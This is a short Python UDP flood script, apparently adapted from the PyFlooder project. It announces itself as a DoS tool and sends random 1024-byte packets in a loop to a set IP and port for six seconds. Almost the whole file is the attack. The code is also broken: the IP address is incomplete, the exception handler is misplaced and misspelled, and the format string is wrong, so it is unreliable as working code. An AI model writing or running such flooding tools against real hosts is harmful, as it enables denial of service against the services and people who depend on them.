#https://github.com/D4Vinci/PyFlooder/blob/master/pyflooder.py

import os, sys, time, socket, random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bites = random._urandom(1024)

os.system("clear")
print("Welcome to Dos")

os.system('clear')
print('')
ip = "128.0.1"
port = 80
dur = 6
timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bites, (ip, port))
        sent = sent + 1
        print("sent $s packets to $s via port %s"%(sent, ip, port))
        except keyboardInterrupt:
            sys.exit(1)
